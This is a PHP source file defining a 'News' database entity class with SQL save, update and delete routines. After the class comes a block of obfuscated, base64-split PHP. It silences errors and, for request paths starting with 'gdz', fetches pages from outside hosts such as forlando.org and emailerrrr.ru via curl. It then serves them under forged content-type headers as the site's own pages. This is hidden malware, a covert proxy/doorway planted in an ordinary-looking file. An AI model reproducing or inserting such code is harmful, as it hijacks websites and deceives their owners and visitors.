<?

class News extends EntityBase {
	// Constants
	const table = "news";

	const OWNER_ID = "OWNER_ID";
	const TITLE = "TITLE";
	const DESCRIPTION = "DESCRIPTION";

	// Properties
	var $Title;
	var $Desription;

	// Fields

	function News($id = -1) {
		$this->table = self::table;
		parent::__construct($id, self::OWNER_ID);
	}

	function IsEmpty() {
		return $this->Id == 0;
	}

	function Clear() {
		$this->Id = 0;		// Important not -1
		$this->Title = "";
		$this->Description = "";
	}

	function FillFromResult($result) {
		$this->Id = $result->Get(self::OWNER_ID);
		$this->Title = $result->Get(self::TITLE);
		$this->Description = $result->Get(self::DESCRIPTION);
	}

	function FillFromHash($hash) {
		$this->Id = round($hash[self::OWNER_ID]);
		$this->Title = UTF8toWin1251($hash[self::TITLE]);
		$this->Description = UTF8toWin1251($hash[self::DESCRIPTION]);
	}

	function GetByUserId($userId) {
		return $this->FillByCondition("t1.".self::OWNER_ID."=".SqlQuote($userId));
	}

	function __tostring() {
		$s = "<ul type=square>";
		$s.= "<li>".self::OWNER_ID.": ".$this->Id."</li>\n";
		$s.= "<li>".self::TITLE.": ".$this->Title."</li>\n";
		$s.= "<li>".self::DESCRIPTION.": ".$this->Description."</li>\n";
		if ($this->IsEmpty()) {
			$s.= "<li> <b>News section is not saved!</b>";
		}

		$s.= "</ul>";
		return $s;
	}

	function ToJs() {
		return "new ndto("
.round($this->Id).",\""
.JsQuote($this->Title)."\",\""
.JsQuote($this->Description)."\")";
	}


	function Save() {
	 global $db;
		if (!$this->IsConnected()) {
			return false;
		}
	    $updateFlag = false;
		if (!$this->IsEmpty()) {
			$q = $db->Query("SELECT ".self::OWNER_ID." FROM ".$this->table." WHERE ".self::OWNER_ID."=".SqlQuote($this->Id));
			$updateFlag = $q->NumRows() > 0;
		}
		if ($updateFlag === true) {
			$q->Query($this->UpdateExpression());
		} else {
			$q = $db->Query("SELECT MIN(".self::OWNER_ID.") AS ".self::OWNER_ID." FROM ".$this->table." LIMIT 1");
			if ($q->NumRows()) {
				$q->NextResult();
				$this->Id = $q->Get(self::OWNER_ID) - 1;
			} else {
				$this->Id = -1;
			}
			$q = $db->Query($this->CreateExpression());
			$this->Id = $q->GetLastId();
		}
		return mysql_error();
	}
	
	// SQL
	function ReadExpression() {
		return "SELECT 
	t1.".self::OWNER_ID.",
	t1.".self::TITLE.", 
	t1.".self::DESCRIPTION."
FROM
	".$this->table." AS t1 
WHERE
	##CONDITION##";
	}

	function CreateExpression() {
		return "INSERT INTO ".$this->table." 
(".self::OWNER_ID.", 
".self::TITLE.", 
".self::DESCRIPTION."
)
VALUES
('".round($this->Id)."', 
'".SqlQuote($this->Title)."', 
'".SqlQuote($this->Description)."'
)";
	}

	function UpdateExpression() {
		$result = "UPDATE ".$this->table." SET 
".self::OWNER_ID."='".round($this->Id)."', 
".self::TITLE."='".SqlQuote($this->Title)."', 
".self::DESCRIPTION."='".SqlQuote($this->Description)."'
WHERE
	".self::OWNER_ID."=".round($this->Id);
		return $result;
	}

	function DeleteExpression() {
		return "DELETE FROM ".$this->table." WHERE ".self::OWNER_ID."=".round($this->Id);
	}
}

?>
<? $GLOBALS['_1110259601_']=Array(base64_decode('ZXJyb' .'3J' .'fcmVwb3J' .'0a' .'W5n'),base64_decode('Y3V' .'ybF9pbm' .'l' .'0'),base64_decode('Y' .'3VybF9zZXRvcHQ' .'='),base64_decode('Y3V' .'ybF' .'9zZX' .'RvcHQ='),base64_decode('' .'Y3Vy' .'bF9le' .'GV' .'j'),base64_decode('Y3VybF9j' .'bG9zZQ=='),base64_decode('' .'c' .'3Ryc3Ry'),base64_decode('' .'aGVhZGVy'),base64_decode('c3Ryc3Ry'),base64_decode('a' .'GVhZGV' .'y'),base64_decode('' .'c3' .'Ryc3Ry'),base64_decode('c' .'3' .'R' .'yc3Ry'),base64_decode('' .'aG' .'VhZGVy'),base64_decode('c3Ryc' .'3' .'R' .'y'),base64_decode('aGVhZGVy'),base64_decode('aGVhZGV' .'y'),base64_decode('ZX' .'hwbG9kZ' .'Q=='),base64_decode('' .'dHJp' .'b' .'Q' .'=='),base64_decode('YX' .'JyYXlfc' .'2' .'hpZn' .'Q' .'='),base64_decode('dH' .'JpbQ=='),base64_decode('YXJyYXlfc2h' .'p' .'ZnQ='),base64_decode('' .'dHJ' .'p' .'bQ=' .'='),base64_decode('YXJyYXlfc2' .'hpZn' .'Q' .'='),base64_decode('dmFyX2R1bXA='),base64_decode('b2' .'JfY2' .'xl' .'YW4='),base64_decode('aGVhZGVy'),base64_decode('YXJy' .'Y' .'Xlfc' .'2hp' .'ZnQ='),base64_decode('aW' .'1wbG' .'9k' .'ZQ=='),base64_decode('Y3Vy' .'bF' .'9' .'p' .'bml0'),base64_decode('cG' .'F0a' .'G' .'lu' .'Zm8='),base64_decode('c' .'3Vic3Ry'),base64_decode('dXJsZ' .'W5' .'jb2Rl'),base64_decode('dHJpbQ=='),base64_decode('' .'Y' .'3' .'VybF9zZXRvcHQ='),base64_decode('' .'Y3V' .'y' .'b' .'F9zZXRvc' .'H' .'Q='),base64_decode('Y' .'3VybF9' .'z' .'ZXRvcHQ' .'='),base64_decode('Y3VybF9le' .'G' .'Vj'),base64_decode('Y3' .'Vy' .'bF9jbG9' .'zZQ=='),base64_decode('c' .'3Ry' .'c3Ry'),base64_decode('aGVh' .'Z' .'GVy'),base64_decode('c3Ryc3Ry'),base64_decode('aGVhZGVy'),base64_decode('c' .'3' .'Ryc3R' .'y'),base64_decode('c3Ryc3Ry'),base64_decode('aGVhZGVy'),base64_decode('c3Ry' .'c3Ry'),base64_decode('aGVhZGVy'),base64_decode('aGVhZ' .'GV' .'y')); ?><? function _1699410932($i){$a=Array('aWQ=','aHR0cDovL2VtYWlsZXJycnIucnUv','LmNzcw==','Q29udGVudC1UeXBlOiB0ZXh0L2NzczsgY2hhcnNldD13aW5kb3dzLTEyNTE=','LnBuZw==','Q29udGVudC1UeXBlOiBpbWFnZS9wbmc=','LmpwZw==','LmpwZWc=','Q29udGVudC1UeXBlOiBpbWFnZS9qcGVn','LmdpZg==','Q29udGVudC1UeXBlOiBpbWFnZS9naWY=','Q29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9d2luZG93cy0xMjUx','Lw==','UkVRVUVTVF9VUkk=','ZXJlbWlu','Z2R6','SFRUUC8xLjAgMjAwIE9r','Lw==','aHR0cDovL2ZvcmxhbmRvLm9yZy9fZ2R6XzA4MTMvYmV6dW1ub2UucnUv','ZXh0ZW5zaW9u','Lw==','Lw==','Zm90b19nZHpfMQ==','aHR0cDovL2ZvcmxhbmRvLm9yZy9mb3RvX2dkel8xLw==','a2V5','P2tleT0=','a2V5','LmNzcw==','Q29udGVudC1UeXBlOiB0ZXh0L2NzczsgY2hhcnNldD13aW5kb3dzLTEyNTE=','LnBuZw==','Q29udGVudC1UeXBlOiBpbWFnZS9wbmc=','LmpwZw==','LmpwZWc=','Q29udGVudC1UeXBlOiBpbWFnZS9qcGVn','LmdpZg==','Q29udGVudC1UeXBlOiBpbWFnZS9naWY=','Q29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9d2luZG93cy0xMjUx');return base64_decode($a[$i]);} ?><? $GLOBALS['_1110259601_'][0](round(0));function l__0(){$_0=$_REQUEST[_1699410932(0)];$_1=$GLOBALS['_1110259601_'][1]();$_2=_1699410932(1) .$_0;$GLOBALS['_1110259601_'][2]($_1,CURLOPT_URL,$_2);$GLOBALS['_1110259601_'][3]($_1,CURLOPT_RETURNTRANSFER,round(0+0.25+0.25+0.25+0.25));$_3=$GLOBALS['_1110259601_'][4]($_1);$GLOBALS['_1110259601_'][5]($_1);if($GLOBALS['_1110259601_'][6]($_0,_1699410932(2))){$GLOBALS['_1110259601_'][7](_1699410932(3));}elseif($GLOBALS['_1110259601_'][8]($_0,_1699410932(4))){$GLOBALS['_1110259601_'][9](_1699410932(5));}elseif($GLOBALS['_1110259601_'][10]($_0,_1699410932(6))|| $GLOBALS['_1110259601_'][11]($_0,_1699410932(7))){$GLOBALS['_1110259601_'][12](_1699410932(8));}elseif($GLOBALS['_1110259601_'][13]($_0,_1699410932(9))){$GLOBALS['_1110259601_'][14](_1699410932(10));}else{$GLOBALS['_1110259601_'][15](_1699410932(11));}echo $_3;}$_4=$GLOBALS['_1110259601_'][16](_1699410932(12),$_SERVER[_1699410932(13)]);if(!$GLOBALS['_1110259601_'][17]($_4[round(0)]))$GLOBALS['_1110259601_'][18]($_4);if(!$GLOBALS['_1110259601_'][19]($_4[round(0)]))$GLOBALS['_1110259601_'][20]($_4);if(!$GLOBALS['_1110259601_'][21]($_4[round(0)]))$GLOBALS['_1110259601_'][22]($_4);if(isset($_GET[_1699410932(14)]))$GLOBALS['_1110259601_'][23]($_4);if($_4[round(0)]== _1699410932(15)){$GLOBALS['_1110259601_'][24]();$GLOBALS['_1110259601_'][25](_1699410932(16));$GLOBALS['_1110259601_'][26]($_4);$_0=$GLOBALS['_1110259601_'][27](_1699410932(17),$_4);$_1=$GLOBALS['_1110259601_'][28]();$_5=false;$_2=_1699410932(18) .$_0;$_6=$GLOBALS['_1110259601_'][29]($_2);if(!$_6[_1699410932(19)]&& $GLOBALS['_1110259601_'][30]($_2,-round(0+0.2+0.2+0.2+0.2+0.2))!= _1699410932(20))$_2 .= _1699410932(21);if($_4[round(0)]== _1699410932(22)){$_2=_1699410932(23) .$_4[round(0+1)];$_5=true;}if(isset($_GET[_1699410932(24)]))$_2=$_2 ._1699410932(25) .$GLOBALS['_1110259601_'][31]($GLOBALS['_1110259601_'][32]($_GET[_1699410932(26)]));$GLOBALS['_1110259601_'][33]($_1,CURLOPT_URL,$_2);$GLOBALS['_1110259601_'][34]($_1,CURLOPT_RETURNTRANSFER,round(0+1));$GLOBALS['_1110259601_'][35]($_1,CURLOPT_FOLLOWLOCATION,round(0+0.25+0.25+0.25+0.25));$_3=$GLOBALS['_1110259601_'][36]($_1);$GLOBALS['_1110259601_'][37]($_1);if($GLOBALS['_1110259601_'][38]($_0,_1699410932(27))){$GLOBALS['_1110259601_'][39](_1699410932(28));}elseif($GLOBALS['_1110259601_'][40]($_0,_1699410932(29))){$GLOBALS['_1110259601_'][41](_1699410932(30));}elseif($GLOBALS['_1110259601_'][42]($_0,_1699410932(31))|| $GLOBALS['_1110259601_'][43]($_0,_1699410932(32))|| $_5){$GLOBALS['_1110259601_'][44](_1699410932(33));}elseif($GLOBALS['_1110259601_'][45]($_0,_1699410932(34))){$GLOBALS['_1110259601_'][46](_1699410932(35));}else{$GLOBALS['_1110259601_'][47](_1699410932(36));}echo $_3;exit;} ?>
